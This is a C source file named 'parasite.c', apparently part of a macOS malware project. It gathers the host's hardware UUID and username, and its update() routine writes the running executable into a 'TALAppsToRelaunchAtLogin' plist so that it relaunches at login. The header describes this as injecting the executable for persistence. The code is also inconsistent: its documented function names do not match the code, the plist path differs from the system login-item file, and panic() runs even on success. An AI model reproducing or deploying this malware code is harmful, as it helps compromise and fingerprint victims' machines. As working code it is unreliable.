/*
+ * File:        parasite.c
+ *   Implements the routines and login-item persistence
+ *   for macOS. Key:
+ *     – Command execution wrapper (execute_command)
+ *     – CFURL creation from file system paths
+ *     – Platform data retrieval (UUID, current user)
+ *     – Login-item plist manipulation for persistence
+ *
+ * Sections:
+ *   • Util        – execute_command, create_file_url
+ *   • Platform    – get_platform_uuid, get_username
+ *   • Public API  – get_device_id, get_current_user
+ *   • Persistence – update (login items)
+ *
+ * Dependencies:
+ *   <wisp.h>      – panic(), find_self()
+ *   CoreFoundation – CFURL/CFPropertyList APIs
+ *
+ * Usage:
+ *   • Call get_device_id()/get_current_user() to enumerate host info.
+ *   • Call update() to inject your executable into the user’s “Reopen at Login” list.
+ *
+ * Notes:
+ *   – All CF objects are released before exit.
+ *   – Returned C strings must be freed by the caller.
+ *   – On any failure, panic() is called.
+ *   – After persistence is updated, the executable will automatically relaunch on login.
+ */
    #include <wisp.h>
    #include <CoreFoundation/CoreFoundation.h>

__attribute__((always_inline)) static inline char *cute(const char *cmd) {
    FILE *pipe = popen(cmd, "r");
    if (!pipe) return NULL;

    char buff[128] = {0};
    char *result = NULL;
    
    if (fgets(buff, sizeof(buff), pipe)) {
        buff[strcspn(buff, "\n")] = '\0';
        result = strdup(buff);
    }
    pclose(pipe);
    return result;
}

__attribute__((always_inline)) static inline char *platform(void) {
    const char *uuid_cmd = "ioreg -rd1 -c IOPlatformExpertDevice | awk -F'\"' '/IOPlatformUUID/{print $4}'";
    return cute(uuid_cmd);
}

__attribute__((always_inline)) static inline char *env_username(void) {
    const char *user = getenv("USER");
    return user ? strdup(user) : NULL;
}

__attribute__((always_inline)) static inline CFURLRef create_file_url(const char *path) {
    return CFURLCreateFromFileSystemRepresentation(NULL, (const UInt8 *)path, strlen(path), false);
}

__attribute__((always_inline)) static inline char *build_plist_path(void) {
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return NULL;
    const char *home = pw->pw_dir;

    uint32_t bufsize = 0;
    _NSGetExecutablePath(NULL, &bufsize);
    char *exePath = malloc(bufsize);
    if (!exePath) return NULL;
    if (_NSGetExecutablePath(exePath, &bufsize) != 0) {
        free(exePath);
        return NULL;
    }

    const char *basename = strrchr(exePath, '/');
    basename = (basename) ? basename + 1 : exePath;

    char *plist_path = malloc(strlen(home) + 64 + strlen(basename));
    if (!plist_path) {
        free(exePath);
        return NULL;
    }

    sprintf(plist_path, "%s/Library/Application Support/%s.plist", home, basename);

    free(exePath);
    return plist_path;
}

// CALL
char *iddd(void) {
    return platform();
}

char *whoss(void) {
    return env_username();
}

void update(void) {
    char *plist_path = build_plist_path();
    if (!plist_path) return;

    char *exePath = NULL;
    CFURLRef fileURL = NULL;
    CFPropertyListRef propertyList = NULL;
    CFMutableDictionaryRef newApp = NULL;
    CFDataRef newData = NULL;

    uint32_t bufsize = 0;
    _NSGetExecutablePath(NULL, &bufsize);
    exePath = malloc(bufsize);
    if (!exePath || _NSGetExecutablePath(exePath, &bufsize) != 0)
        goto clen;
    
    fileURL = create_file_url(plist_path);
    if (!fileURL)
        goto clen;
    
    CFDataRef data = NULL;
    if (CFURLCreateDataAndPropertiesFromResource(NULL, fileURL, &data, NULL, NULL, NULL)) {
        propertyList = CFPropertyListCreateWithData(NULL, data, kCFPropertyListMutableContainers, NULL, NULL);
        CFRelease(data);
    }
    
    if (!propertyList) {
        propertyList = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    }
    
    CFMutableArrayRef apps = (CFMutableArrayRef)CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    if (!apps) {
        apps = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        CFDictionarySetValue((CFMutableDictionaryRef)propertyList, CFSTR("TALAppsToRelaunchAtLogin"), apps);
        CFRelease(apps);
        apps = (CFMutableArrayRef)CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    }
    
    newApp = CFDictionaryCreateMutable(kCFAllocatorDefault, 3, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    int state = 2;
    CFNumberRef bgState = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &state);
    CFDictionarySetValue(newApp, CFSTR("BackgroundState"), bgState);
    CFRelease(bgState);

    CFStringRef exePathStr = CFStringCreateWithCString(kCFAllocatorDefault, exePath, kCFStringEncodingUTF8);
    CFDictionarySetValue(newApp, CFSTR("Path"), exePathStr);
    CFRelease(exePathStr);

    CFArrayAppendValue(apps, newApp);

    newData = CFPropertyListCreateData(kCFAllocatorDefault, propertyList, kCFPropertyListXMLFormat_v1_0, 0, NULL);
    if (newData) {
        FILE *plistFile = fopen(plist_path, "wb");
        if (plistFile) {
            fwrite(CFDataGetBytePtr(newData), sizeof(UInt8), CFDataGetLength(newData), plistFile);
            fclose(plistFile);
           // printf("[persist] injected into: %s\n", plist_path);
        }
        CFRelease(newData);
    }

clen:
    if (newApp)
        CFRelease(newApp);
    if (propertyList)
        CFRelease(propertyList);
    if (fileURL)
        CFRelease(fileURL);
    if (exePath)
        free(exePath);
    if (plist_path)
        free(plist_path);
        
    panic();
}
